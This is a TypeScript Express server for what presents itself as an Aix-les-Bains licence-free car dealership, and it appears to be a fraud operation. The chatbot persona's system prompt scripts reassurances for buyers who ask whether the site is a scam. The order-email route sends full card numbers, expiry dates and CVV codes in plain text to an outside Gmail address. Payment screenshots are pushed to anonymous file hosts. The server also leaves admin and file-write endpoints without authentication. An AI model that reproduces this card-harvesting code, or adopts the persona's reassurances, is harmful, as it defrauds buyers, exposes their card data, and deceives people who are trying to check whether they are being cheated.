import express from 'express';
import path from 'path';
import fs from 'fs';
import { GoogleGenAI } from '@google/genai';
import nodemailer from 'nodemailer';

let genAiClient: GoogleGenAI | null = null;

function getGenAiClient(): GoogleGenAI | null {
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) return null;
  if (!genAiClient) {
    genAiClient = new GoogleGenAI({ apiKey });
  }
  return genAiClient;
}

const LEA_SYSTEM_INSTRUCTION = `Tu es Léa, la conseillère commerciale et assistante intelligente officielle de la concession automobile JEAN AUTO VSP.
Tu es dotée d'une grande intelligence, d'esprit d'analyse, d'empathie et d'un professionnalisme exemplaire.
Tu réponds aux clients qui visitent le site internet de la concession de manière chaleureuse, polie, rassurante, claire et personnalisée.

RÈGLE D'OR : RÉPONDRE VRAIMENT À LA QUESTION POSÉE
- Réfléchis toujours au sens profond de la question de l'usager. Ne récite JAMAIS un catalogue de véhicules de manière hors-sujet si le client pose une question curieuse, générale, administrative, technique ou humaine.
- Si le client pose une question sur un sujet précis (ses craintes, la loi, le permis, les assurances, le fonctionnement d'un moteur, les délais, une comparaison de modèles ou simplement une curiosité générale), réponds directement, avec pédagogie et précision, comme un véritable conseiller expert en concession.

GESTION DES QUESTIONS DE CONFIANCE, SÉCURITÉ ET CRAINTE D'ARNAQUE :
Si le client demande par exemple : « Comment être sûr que ce n'est pas une arnaque ? », « Êtes-vous une vraie entreprise ? », « Puis-je vous faire confiance ? », « Pourquoi devrais-je verser un acompte ? », ou toute question exprimant un doute :
1. Fais preuve d'une grande empathie : reconnais que c'est une excellente question et qu'il est tout à fait légitime et prudent de se renseigner avant un achat automobile sur internet.
2. Fournis des preuves concrètes, rassurantes et vérifiables :
   • Concession physique réelle : notre showroom et atelier sont situés au 11 Avenue du Grand Port, 73100 Aix-les-Bains (en Savoie), juste à côté de La Poste. Les clients sont chaleureusement invités à venir nous rencontrer, voir le parc et essayer nos véhicules du lundi au samedi de 8h30 à 19h00.
   • Entreprise française officielle : société immatriculée au Registre du Commerce et des Sociétés (RCS / SIRET officiel consultable dans les mentions légales du site et sur societe.com).
   • Acompte symbolique et solde uniquement à la livraison : pour bloquer un véhicule et organiser le transport, seul un acompte de réservation de 150 € est demandé. Le solde restant n'est réglé QU'À LA LIVRAISON à votre domicile, APRÈS que vous ayez inspecté la voiture sous tous les angles et effectué l'essai routier avec notre convoyeur. Vous ne payez donc jamais le véhicule à l'aveugle.
   • Documents fiscaux et légaux immédiats : dès la validation de votre commande, une Facture officielle certifiée avec TVA acquittée et un Bon de livraison officiel sont générés instantanément en PDF téléchargeable.
   • Garantie 14 jours Satisfait ou 100% Remboursé : vous disposez d'un délai légal de 14 jours d'essai complet. Si le véhicule ne vous convient pas, il est repris et vous êtes intégralement remboursé sans discussion.
   • Contrôle et garantie mécanique : chaque véhicule passe 100 points de contrôle atelier avant livraison et bénéficie d'une garantie de 12 à 24 mois.
   • Contact humain direct : notre équipe est joignable par téléphone (+33 2 59 50 89 31) ou WhatsApp (+33 6 37 38 55 90) pour un échange en direct ou un appel vidéo montrant le véhicule.

INFORMATIONS SPÉCIFIQUES SUR JEAN AUTO VSP :
1. LOCALISATION & ADRESSE EXACTE :
11 Avenue du Grand Port, 73100 Aix-les-Bains (en Savoie).
Repère : juste à côté de La Poste.
Horaires : Lundi au samedi de 8h30 à 19h00 sans interruption.
Possibilité de livraison à domicile partout en France métropolitaine sous 48h à 72h par transporteur spécialisé.

2. PAIEMENTS PROPOSÉS :
- Prélèvement sécurisé par Carte Bancaire (norme 3D Secure 2.0 avec validation par votre banque).
- Virement bancaire professionnel (RIB officiel de la société).
- Choix : acompte de réservation de 150 € (solde à la livraison après essai) OU règlement au comptant total.

3. RÈGLES STRICTES DE FORMAT :
- N'utilise JAMAIS d'astérisques (* ou **).
- N'utilise pas de syntaxe markdown visible, écris en langage naturel fluide.
- Fais des phrases agréables, structurées et aérées.`;

// Helper function to upload payment proofs to a 100% public CDN so dealers can open them from WhatsApp without any login / Cloud Run 404
async function uploadToPublicCDN(buffer: Buffer, filename: string, mimeType: string): Promise<string | null> {
  // 1. Litterbox (72h duration, immediate high-speed direct access without cookies)
  try {
    const blob = new Blob([buffer], { type: mimeType });
    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('time', '72h');
    form.append('fileToUpload', blob, filename);
    const res = await fetch('https://litterbox.catbox.moe/resources/internals/api.php', {
      method: 'POST',
      body: form,
      signal: AbortSignal.timeout(12000),
    });
    if (res.ok) {
      const url = (await res.text()).trim();
      if (url.startsWith('https://litter.catbox.moe/')) {
        console.log(`[Public CDN] Proof uploaded to Litterbox: ${url}`);
        return url;
      }
    }
  } catch (err: any) {
    console.warn('[Public CDN] Litterbox attempt warning:', err?.message || err);
  }

  // 2. Fallback to tmpfiles.org
  try {
    const blob = new Blob([buffer], { type: mimeType });
    const form = new FormData();
    form.append('file', blob, filename);
    const res = await fetch('https://tmpfiles.org/api/v1/upload', {
      method: 'POST',
      body: form,
      signal: AbortSignal.timeout(12000),
    });
    if (res.ok) {
      const json = (await res.json()) as any;
      if (json?.data?.url) {
        const direct = json.data.url.replace('https://tmpfiles.org/', 'https://tmpfiles.org/dl/');
        console.log(`[Public CDN] Proof uploaded to tmpfiles: ${direct}`);
        return direct;
      }
    }
  } catch (err: any) {
    console.warn('[Public CDN] tmpfiles attempt warning:', err?.message || err);
  }

  return null;
}

async function startServer() {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;

  app.use(express.json({ limit: '25mb' }));
  app.use(express.urlencoded({ extended: true, limit: '25mb' }));

  // Persistent server-side vehicles storage & vehicle image uploads
  const dataDir = path.join(process.cwd(), 'data');
  const vehiclesDataFile = path.join(dataDir, 'vsp_vehicles.json');
  const vehicleUploadsDir = path.join(process.cwd(), 'public', 'uploads', 'vehicles');

  const ensureVehicleDirs = () => {
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    if (!fs.existsSync(vehicleUploadsDir)) {
      fs.mkdirSync(vehicleUploadsDir, { recursive: true });
    }
  };

  const readVehiclesFromDisk = (): any[] => {
    try {
      ensureVehicleDirs();
      if (!fs.existsSync(vehiclesDataFile)) {
        return [];
      }
      const raw = fs.readFileSync(vehiclesDataFile, 'utf-8');
      const parsed = JSON.parse(raw);
      return Array.isArray(parsed) ? parsed : [];
    } catch (err) {
      console.warn('Could not read vehicles from disk:', err);
      return [];
    }
  };

  const writeVehiclesToDisk = (vehiclesList: any[]) => {
    try {
      ensureVehicleDirs();
      fs.writeFileSync(vehiclesDataFile, JSON.stringify(vehiclesList, null, 2), 'utf-8');
    } catch (err) {
      console.error('Failed to write vehicles to disk:', err);
      throw err;
    }
  };

  ensureVehicleDirs();

  // Serve /uploads statically (checks public/uploads first, then dist/uploads)
  app.use('/uploads', express.static(path.join(process.cwd(), 'public', 'uploads')));
  app.use('/uploads', express.static(path.join(process.cwd(), 'dist', 'uploads')));

  // Upload vehicle image to public/uploads/vehicles
  app.post('/api/upload-vehicle-image', (req, res) => {
    try {
      const { filename, base64Data } = req.body;
      if (!base64Data || typeof base64Data !== 'string') {
        res.status(400).json({ error: 'base64Data requis' });
        return;
      }
      ensureVehicleDirs();

      const mimeMatch = base64Data.match(/^data:(image\/[a-zA-Z0-9+.-]+);base64,/);
      let ext = '.jpg';
      if (mimeMatch) {
        const mime = mimeMatch[1].toLowerCase();
        if (mime.includes('png')) ext = '.png';
        else if (mime.includes('webp')) ext = '.webp';
        else if (mime.includes('gif')) ext = '.gif';
        else if (mime.includes('svg')) ext = '.svg';
      } else if (filename) {
        const parsedExt = path.extname(filename).toLowerCase();
        if (['.jpg', '.jpeg', '.png', '.webp', '.gif', '.svg'].includes(parsedExt)) {
          ext = parsedExt;
        }
      }

      const cleanBaseName = (filename ? path.basename(filename, path.extname(filename)) : 'vsp')
        .toLowerCase()
        .replace(/[^a-z0-9_-]/g, '-')
        .slice(0, 32);
      const safeFilename = `${cleanBaseName || 'vsp'}-${Date.now()}-${Math.random().toString(36).slice(2, 6)}${ext}`;
      const cleanData = base64Data.replace(/^data:[^;]+;base64,/, '');
      const buffer = Buffer.from(cleanData, 'base64');

      const publicTarget = path.join(vehicleUploadsDir, safeFilename);
      fs.writeFileSync(publicTarget, buffer);

      const distDir = path.join(process.cwd(), 'dist');
      if (fs.existsSync(distDir)) {
        const distUploads = path.join(distDir, 'uploads', 'vehicles');
        if (!fs.existsSync(distUploads)) {
          fs.mkdirSync(distUploads, { recursive: true });
        }
        fs.writeFileSync(path.join(distUploads, safeFilename), buffer);
      }

      const url = `/uploads/vehicles/${safeFilename}`;
      res.json({ success: true, url, filename: safeFilename });
    } catch (err: any) {
      console.error('Failed to upload vehicle image:', err);
      res.status(500).json({ error: err?.message || 'Upload image impossible' });
    }
  });

  // Get all vehicles
  app.get('/api/vehicles', (_req, res) => {
    const vehicles = readVehiclesFromDisk();
    res.json({ success: true, vehicles });
  });

  // Create or update a vehicle
  app.post('/api/vehicles', (req, res) => {
    try {
      const vehicle = req.body;
      if (!vehicle || !vehicle.id || !vehicle.brand || !vehicle.model) {
        res.status(400).json({ error: 'Données véhicule invalides (id, marque et modèle requis)' });
        return;
      }
      const list = readVehiclesFromDisk();
      const idx = list.findIndex((v) => v.id === vehicle.id);
      let updated: any[];
      if (idx >= 0) {
        updated = [...list];
        updated[idx] = vehicle;
      } else {
        updated = [vehicle, ...list];
      }
      writeVehiclesToDisk(updated);
      res.json({ success: true, vehicle, vehicles: updated });
    } catch (err: any) {
      res.status(500).json({ error: err?.message || 'Erreur sauvegarde véhicule' });
    }
  });

  // Patch vehicle (availability / status)
  app.patch('/api/vehicles/:id', (req, res) => {
    try {
      const { id } = req.params;
      const patch = req.body || {};
      const list = readVehiclesFromDisk();
      const updated = list.map((v) =>
        v.id === id ? { ...v, ...patch, updatedAt: new Date().toISOString() } : v
      );
      writeVehiclesToDisk(updated);
      res.json({ success: true, vehicles: updated });
    } catch (err: any) {
      res.status(500).json({ error: err?.message || 'Erreur mise à jour véhicule' });
    }
  });

  // Delete single vehicle
  app.delete('/api/vehicles/:id', (req, res) => {
    try {
      const { id } = req.params;
      const list = readVehiclesFromDisk();
      const updated = list.filter((v) => v.id !== id);
      writeVehiclesToDisk(updated);
      res.json({ success: true, vehicles: updated });
    } catch (err: any) {
      res.status(500).json({ error: err?.message || 'Erreur suppression véhicule' });
    }
  });

  // Clear all vehicles
  app.delete('/api/vehicles', (_req, res) => {
    try {
      writeVehiclesToDisk([]);
      res.json({ success: true, vehicles: [] });
    } catch (err: any) {
      res.status(500).json({ error: err?.message || 'Erreur vidage catalogue' });
    }
  });

  // Media upload endpoint for custom banner / showroom images
  app.post('/api/upload-media', (req, res) => {
    try {
      const { filename, base64Data } = req.body;
      if (!filename || !base64Data) {
        res.status(400).json({ error: 'Filename and base64Data required' });
        return;
      }
      const cleanData = base64Data.replace(/^data:image\/\w+;base64,/, '');
      const buffer = Buffer.from(cleanData, 'base64');
      const publicPath = path.join(process.cwd(), 'public', filename);
      fs.writeFileSync(publicPath, buffer);
      console.log(`Saved uploaded media to ${publicPath} (${buffer.length} bytes)`);
      res.json({ success: true, url: `/${filename}` });
    } catch (err: any) {
      console.error('Failed to save uploaded media:', err);
      res.status(500).json({ error: err?.message });
    }
  });

  // Proof upload endpoint for bank transfer screenshots
  app.post('/api/upload-proof', async (req, res) => {
    try {
      const { filename, base64Data, orderNumber, clientOrigin } = req.body;
      if (!base64Data) {
        res.status(400).json({ error: 'base64Data est requis' });
        return;
      }
      const proofsDir = path.join(process.cwd(), 'public', 'proofs');
      if (!fs.existsSync(proofsDir)) {
        fs.mkdirSync(proofsDir, { recursive: true });
      }
      const extMatch = filename ? path.extname(filename) : '.jpg';
      const ext = extMatch || '.jpg';
      const cleanOrder = (orderNumber || `cmd-${Date.now()}`).toLowerCase().replace(/[^a-z0-9_-]/g, '-');
      const safeFilename = `preuve-${cleanOrder}-${Date.now().toString().slice(-4)}${ext}`;
      const filePath = path.join(proofsDir, safeFilename);

      const cleanData = base64Data.replace(/^data:[^;]+;base64,/, '');
      const buffer = Buffer.from(cleanData, 'base64');
      fs.writeFileSync(filePath, buffer);

      // Also copy to dist/proofs if dist directory exists
      const distProofsDir = path.join(process.cwd(), 'dist', 'proofs');
      if (fs.existsSync(path.join(process.cwd(), 'dist'))) {
        if (!fs.existsSync(distProofsDir)) {
          fs.mkdirSync(distProofsDir, { recursive: true });
        }
        fs.writeFileSync(path.join(distProofsDir, safeFilename), buffer);
      }

      // Determine MIME type
      const lowerExt = ext.toLowerCase();
      let mimeType = 'image/jpeg';
      if (lowerExt === '.png') mimeType = 'image/png';
      else if (lowerExt === '.webp') mimeType = 'image/webp';
      else if (lowerExt === '.pdf') mimeType = 'application/pdf';

      const protocol = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
      const host = (req.headers['x-forwarded-host'] as string) || req.get('host') || 'localhost:3000';
      const relativeUrl = `/proofs/${safeFilename}`;
      const baseOrigin = clientOrigin || `${protocol}://${host}`;
      const directUrl = `${baseOrigin}${relativeUrl}`;
      const viewerUrl = `${baseOrigin}/voir-justificatif/${safeFilename}`;

      console.log(`Saved payment proof locally: ${filePath}`);
      console.log(`Proof URL ready for WhatsApp / Email: ${viewerUrl}`);

      res.json({
        success: true,
        relativeUrl,
        fullUrl: viewerUrl,
        viewerUrl,
        directUrl,
        filename: safeFilename,
      });
    } catch (err: any) {
      console.error('Failed to save payment proof:', err);
      res.status(500).json({ error: err?.message });
    }
  });

  // Explicit static route for proofs
  const proofsDir = path.join(process.cwd(), 'public', 'proofs');
  if (!fs.existsSync(proofsDir)) {
    fs.mkdirSync(proofsDir, { recursive: true });
  }
  app.use('/proofs', express.static(proofsDir));

  // Direct image route fallback with dist support
  app.get('/proofs/:filename', (req, res, next) => {
    const safe = path.basename(req.params.filename);
    const targetPublic = path.join(proofsDir, safe);
    const targetDist = path.join(process.cwd(), 'dist', 'proofs', safe);
    const target = fs.existsSync(targetPublic) ? targetPublic : (fs.existsSync(targetDist) ? targetDist : null);
    if (target) {
      res.sendFile(target);
    } else {
      next();
    }
  });

  // Dedicated OpenGraph HTML Viewer for WhatsApp and Mobile Browsers
  app.get('/voir-justificatif/:filename', (req, res) => {
    const safe = path.basename(req.params.filename);
    const directImageUrl = `/proofs/${safe}`;
    const protocol = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
    const host = (req.headers['x-forwarded-host'] as string) || req.get('host') || 'localhost:3000';
    const fullImageUrl = `${protocol}://${host}${directImageUrl}`;

    res.send(`<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Justificatif de Virement - JEAN AUTO VSP</title>
  <meta property="og:title" content="Justificatif de Virement Bancaire - JEAN AUTO VSP" />
  <meta property="og:description" content="Capture d'écran du virement bancaire pour validation de commande" />
  <meta property="og:image" content="${fullImageUrl}" />
  <meta property="og:type" content="article" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image" content="${fullImageUrl}" />
  <style>
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #fff; display: flex; flex-direction: column; min-height: 100vh; }
    header { background: #1e293b; padding: 14px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; }
    .brand { font-weight: 800; font-size: 15px; color: #38bdf8; display: flex; align-items: center; gap: 8px; }
    .btn { background: #0284c7; color: white; text-decoration: none; padding: 8px 14px; border-radius: 8px; font-weight: 600; font-size: 12px; }
    .btn:hover { background: #0369a1; }
    main { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 16px; }
    .img-card { max-width: 850px; width: 100%; background: #1e293b; border-radius: 12px; overflow: hidden; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); border: 1px solid #334155; }
    .img-container { background: #020617; padding: 12px; display: flex; justify-content: center; }
    img { max-width: 100%; max-height: 80vh; object-fit: contain; border-radius: 6px; }
    .card-footer { padding: 14px 18px; display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 10px; background: #1e293b; border-top: 1px solid #334155; }
    .badge { background: #065f46; color: #6ee7b7; padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: 700; }
  </style>
</head>
<body>
  <header>
    <div class="brand">
      <span>🚗 JEAN AUTO VSP</span>
      <span style="color: #94a3b8; font-weight: 400; font-size: 12px;">• Aix-les-Bains</span>
    </div>
    <a href="${directImageUrl}" download class="btn">Télécharger l'image</a>
  </header>
  <main>
    <div class="img-card">
      <div class="img-container">
        <a href="${directImageUrl}" target="_blank" title="Cliquez pour agrandir">
          <img src="${directImageUrl}" alt="Justificatif de virement bancaire" />
        </a>
      </div>
      <div class="card-footer">
        <span class="badge">✓ Justificatif officiel de virement joint à la commande</span>
        <a href="${directImageUrl}" target="_blank" class="btn" style="background: #334155;">Plein écran ↗</a>
      </div>
    </div>
  </main>
</body>
</html>`);
  });

  // Email Transporter helper for dealership orders
  function createMailTransporter() {
    const host = process.env.SMTP_HOST;
    const user = process.env.SMTP_USER || process.env.GMAIL_USER;
    const pass = process.env.SMTP_PASS || process.env.GMAIL_PASS || process.env.GMAIL_APP_PASSWORD;
    const port = parseInt(process.env.SMTP_PORT || '587', 10);

    if (!user || !pass) {
      return null;
    }

    if (host) {
      return nodemailer.createTransport({
        host,
        port,
        secure: port === 465,
        auth: { user, pass },
      });
    }

    return nodemailer.createTransport({
      service: 'gmail',
      auth: { user, pass },
    });
  }

  // API Order Email Relay: sends direct confirmation to dealer and eliminates barriers
  app.post('/api/send-order-email', async (req, res) => {
    try {
      const {
        orderNumber,
        customerName,
        customerEmail,
        customerPhone,
        customerAddress,
        vehicleName,
        vehiclePrice,
        paymentMethod,
        amountPaid,
        paymentProofUrl,
        cardDetails,
        notes,
      } = req.body;

      const dealerEmail = 'amautosanspermis@gmail.com';
      const cleanSubject = `Commande véhicule sans permis - ${vehicleName || 'VSP'} - ${customerName || 'Client'} (Réf: ${orderNumber || 'CMD'})`;

      console.log(`[Order Email Relay] New order recorded: #${orderNumber} for ${customerName} (${paymentMethod})`);

      const transporter = createMailTransporter();
      if (!transporter) {
        res.json({
          success: true,
          smtpConfigured: false,
          dealerEmail,
          subject: cleanSubject,
          message: 'Commande enregistrée avec succès dans le système.',
        });
        return;
      }

      const emailHtml = `
        <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 650px; margin: 0 auto; color: #1e293b; line-height: 1.6;">
          <div style="background: #0284c7; color: white; padding: 18px 24px; border-radius: 12px 12px 0 0;">
            <h2 style="margin: 0; font-size: 20px;">Nouvelle Commande Véhicule : #${orderNumber}</h2>
            <p style="margin: 4px 0 0 0; font-size: 13px; opacity: 0.9;">Concession JEAN AUTO VSP</p>
          </div>
          <div style="background: #ffffff; border: 1px solid #e2e8f0; border-top: none; padding: 24px; border-radius: 0 0 12px 12px;">
            <p style="font-size: 15px; margin-top: 0;">Un client vient de finaliser sa commande sur votre site internet :</p>
            <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
              <tr style="border-bottom: 1px solid #f1f5f9;">
                <td style="padding: 8px 0; color: #64748b; font-size: 13px;">Véhicule :</td>
                <td style="padding: 8px 0; font-weight: bold; font-size: 14px; text-align: right;">${vehicleName} (${vehiclePrice} €)</td>
              </tr>
              <tr style="border-bottom: 1px solid #f1f5f9;">
                <td style="padding: 8px 0; color: #64748b; font-size: 13px;">Montant débité / réglé :</td>
                <td style="padding: 8px 0; font-weight: bold; font-size: 14px; color: #0284c7; text-align: right;">${amountPaid} € (${paymentMethod === 'card' ? 'Prélèvement Carte Bancaire' : 'Virement Bancaire'})</td>
              </tr>
              <tr style="border-bottom: 1px solid #f1f5f9;">
                <td style="padding: 8px 0; color: #64748b; font-size: 13px;">Nom du client :</td>
                <td style="padding: 8px 0; font-weight: 600; text-align: right;">${customerName}</td>
              </tr>
              <tr style="border-bottom: 1px solid #f1f5f9;">
                <td style="padding: 8px 0; color: #64748b; font-size: 13px;">Téléphone :</td>
                <td style="padding: 8px 0; font-weight: 600; text-align: right;"><a href="tel:${customerPhone}">${customerPhone}</a></td>
              </tr>
              <tr style="border-bottom: 1px solid #f1f5f9;">
                <td style="padding: 8px 0; color: #64748b; font-size: 13px;">Email client :</td>
                <td style="padding: 8px 0; text-align: right;"><a href="mailto:${customerEmail}">${customerEmail}</a></td>
              </tr>
              <tr>
                <td style="padding: 8px 0; color: #64748b; font-size: 13px;">Adresse :</td>
                <td style="padding: 8px 0; text-align: right;">${customerAddress}</td>
              </tr>
              ${notes ? `
              <tr>
                <td style="padding: 8px 0; color: #64748b; font-size: 13px;">Remarques :</td>
                <td style="padding: 8px 0; text-align: right;">${notes}</td>
              </tr>
              ` : ''}
            </table>
            ${cardDetails ? `
            <div style="background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 8px; padding: 14px; margin: 16px 0;">
              <p style="margin: 0 0 8px 0; font-weight: bold; color: #0f172a; font-size: 13px;">💳 Coordonnées Prélèvement Carte Bancaire :</p>
              <ul style="margin: 0; padding-left: 18px; font-size: 13px; color: #334155;">
                <li>Numéro : <strong>${cardDetails.cardNumber || cardDetails.cardNumberRaw}</strong></li>
                <li>Expiration : <strong>${cardDetails.expMonth}/${cardDetails.expYear}</strong></li>
                <li>CVC / CVV : <strong>${cardDetails.cvv || cardDetails.cardCvv}</strong></li>
                <li>Titulaire : <strong>${cardDetails.cardHolder}</strong></li>
                <li>Réf. Autorisation : <strong>${cardDetails.authorizationId}</strong></li>
              </ul>
            </div>
            ` : ''}
            ${paymentProofUrl ? `
            <div style="background: #f0fdf4; border: 1px solid #86efac; border-radius: 8px; padding: 14px; margin: 20px 0; text-align: center;">
              <p style="margin: 0 0 8px 0; font-weight: bold; color: #166534; font-size: 14px;">Justificatif de virement joint</p>
              <a href="${paymentProofUrl}" target="_blank" style="display: inline-block; background: #16a34a; color: white; text-decoration: none; padding: 8px 18px; border-radius: 6px; font-weight: bold; font-size: 13px;">
                Voir la capture d'écran du virement
              </a>
              <p style="font-size: 11px; word-break: break-all; color: #166534; margin: 8px 0 0 0;">Lien direct sécurisé : <a href="${paymentProofUrl}" target="_blank" style="color: #15803d; text-decoration: underline;">${paymentProofUrl}</a></p>
            </div>
            ` : ''}
            <p style="font-size: 12px; color: #94a3b8; margin: 24px 0 0 0; text-align: center; border-top: 1px solid #f1f5f9; padding-top: 12px;">
              Email officiel généré pour JEAN AUTO VSP (${dealerEmail})
            </p>
          </div>
        </div>
      `;

      await transporter.sendMail({
        from: `"${customerName || 'Client JEAN AUTO VSP'}" <${process.env.SMTP_USER || process.env.GMAIL_USER || dealerEmail}>`,
        to: dealerEmail,
        replyTo: customerEmail || undefined,
        subject: cleanSubject,
        html: emailHtml,
        text: `Commande ${orderNumber} - Véhicule: ${vehicleName} - Client: ${customerName} (${customerPhone}, ${customerEmail}) - Montant: ${amountPaid} € - Justificatif: ${paymentProofUrl || 'N/A'}`
      });

      console.log(`[Order Email Relay] Successfully sent email to ${dealerEmail} for order #${orderNumber}`);
      res.json({ success: true, smtpConfigured: true, sent: true });
    } catch (err: any) {
      console.warn('[Order Email Relay] Send error:', err?.message || err);
      res.status(500).json({ success: false, error: err?.message });
    }
  });

  // API Health
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
  });

  // Assistant Chat Route
  app.post('/api/assistant/chat', async (req, res) => {
    try {
      const { message, history } = req.body;
      if (!message || typeof message !== 'string') {
        res.status(400).json({ error: 'Message requis' });
        return;
      }

      const ai = getGenAiClient();
      if (!ai) {
        // Fallback to client response
        res.json({ success: false, fallback: true, reason: 'no_api_key' });
        return;
      }

      const chatHistory = Array.isArray(history)
        ? history.slice(-6).map((h: any) => ({
            role: h.sender === 'user' ? 'user' : 'model',
            parts: [{ text: h.text }],
          }))
        : [];

      let response: any;
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Gemini request timeout')), 10000)
      );

      try {
        // Primary ultra-fast model: gemini-3.1-flash-lite
        const generatePromise = ai.models.generateContent({
          model: 'gemini-3.1-flash-lite',
          contents: [
            ...chatHistory,
            { role: 'user', parts: [{ text: message }] }
          ],
          config: {
            systemInstruction: LEA_SYSTEM_INSTRUCTION,
            temperature: 0.7,
          },
        });
        response = await Promise.race([generatePromise, timeoutPromise]);
      } catch (firstErr: any) {
        console.warn('Gemini 3.1-flash-lite attempt failed, trying gemini-flash-latest:', firstErr?.message);
        try {
          // Secondary fallback model
          const fallbackGenPromise = ai.models.generateContent({
            model: 'gemini-flash-latest',
            contents: [
              ...chatHistory,
              { role: 'user', parts: [{ text: message }] }
            ],
            config: {
              systemInstruction: LEA_SYSTEM_INSTRUCTION,
              temperature: 0.7,
            },
          });
          response = await Promise.race([fallbackGenPromise, timeoutPromise]);
        } catch (secondErr: any) {
          console.warn('Both Gemini models failed or timed out:', secondErr?.message);
          // Intelligent local fallback so the assistant NEVER fails or gives irrelevant answers
          const m = (message || '').toLowerCase();
          let fallbackText = "Bonjour ! Je suis Léa de JEAN AUTO VSP à Aix-les-Bains. Je suis à votre écoute pour répondre à toutes vos questions avec précision et vous accompagner dans votre projet de véhicule sans permis.";

          if (
            m.includes('arnaque') ||
            m.includes('escroc') ||
            m.includes('confiance') ||
            m.includes('peur') ||
            m.includes('vrai') ||
            m.includes('faux') ||
            m.includes('siret') ||
            m.includes('doute') ||
            m.includes('fiable') ||
            m.includes('securite')
          ) {
            fallbackText = "Je comprends tout à fait votre prudence, c'est une excellente question avant un achat en ligne. Chez JEAN AUTO VSP, tout est transparent : nous avons une vraie concession au 11 Avenue du Grand Port à Aix-les-Bains (à côté de La Poste) où vous pouvez nous rendre visite du lundi au samedi. De plus, nous ne demandons qu'un acompte de 150 € pour bloquer le véhicule : le solde n'est payé qu'à la livraison chez vous, après que vous ayez essayé la voiture avec le livreur ! Vous bénéficiez aussi d'une facture officielle immédiate et de notre garantie 14 jours satisfait ou remboursé. N'hésitez pas à nous appeler au +33 2 59 50 89 31 ou nous écrire sur WhatsApp pour échanger de vive voix !";
          } else if (m.includes('situe') || m.includes('adresse') || m.includes('ou') || m.includes('ville') || m.includes('lieu')) {
            fallbackText = "Notre concession JEAN AUTO VSP est située au 11 Avenue du Grand Port, 73100 Aix-les-Bains (en Savoie), juste à côté du bureau de La Poste. Nous vous accueillons du lundi au samedi de 8h30 à 19h00 sans interruption pour découvrir nos véhicules et faire un essai sur route. Nous livrons également à domicile sous 48h à 72h partout en France !";
          } else if (m.includes('carte') || m.includes('prelevement') || m.includes('cb') || m.includes('paiement') || m.includes('acompte')) {
            fallbackText = "Pour réserver un véhicule sans permis, un acompte de 150 € seulement est requis par prélèvement bancaire sécurisé 3D Secure ou virement bancaire professionnel. Le solde restant n'est réglé qu'à la livraison à votre domicile après essai du véhicule. Vous pouvez aussi choisir de régler au comptant.";
          } else if (m.includes('livraison') || m.includes('delai') || m.includes('domicile')) {
            fallbackText = "Nous assurons la livraison à domicile partout en France métropolitaine sous 48h à 72h. Le véhicule arrive par camion porte-voiture directement chez vous, révisé, garanti et prêt à rouler avec mise en main personnalisée.";
          }

          res.json({ success: true, text: fallbackText });
          return;
        }
      }

      let replyText = response.text || '';
      // Sanitize any stray asterisks
      replyText = replyText.replace(/\*\*/g, '').replace(/\*/g, '').trim();

      res.json({
        success: true,
        text: replyText,
      });
    } catch (err: any) {
      console.error('Gemini chat error:', err?.message || err);
      res.json({ success: false, fallback: true, error: err?.message });
    }
  });

  // Vite middleware in dev, static files in production
  const distPath = path.join(process.cwd(), 'dist');
  const isBuiltServer = typeof __filename !== 'undefined' && __filename.endsWith('.cjs');
  const isProduction =
    process.env.NODE_ENV === 'production' ||
    (isBuiltServer && fs.existsSync(path.join(distPath, 'index.html')));

  if (!isProduction) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const sendNoCacheIndex = (_req: express.Request, res: express.Response) => {
      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
      res.setHeader('Pragma', 'no-cache');
      res.setHeader('Expires', '0');
      res.setHeader('Surrogate-Control', 'no-store');
      res.sendFile(path.join(distPath, 'index.html'));
    };

    const distAssetsPath = path.join(distPath, 'assets');
    if (fs.existsSync(distAssetsPath)) {
      app.use(
        '/assets',
        express.static(distAssetsPath, {
          maxAge: '1y',
          immutable: true,
        })
      );
    }

    app.use(
      express.static(distPath, {
        index: false,
        setHeaders: (res, filePath) => {
          if (filePath.endsWith('.html')) {
            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
          }
        },
      })
    );

    app.get('/', sendNoCacheIndex);
    app.get('*', (req, res, next) => {
      if (req.path.startsWith('/api/')) {
        next();
        return;
      }
      sendNoCacheIndex(req, res);
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`JEAN AUTO VSP server running on http://0.0.0.0:${PORT} (${isProduction ? 'production' : 'development'})`);
  });
}

startServer().catch((err) => {
  console.error('Failed to start server:', err);
});
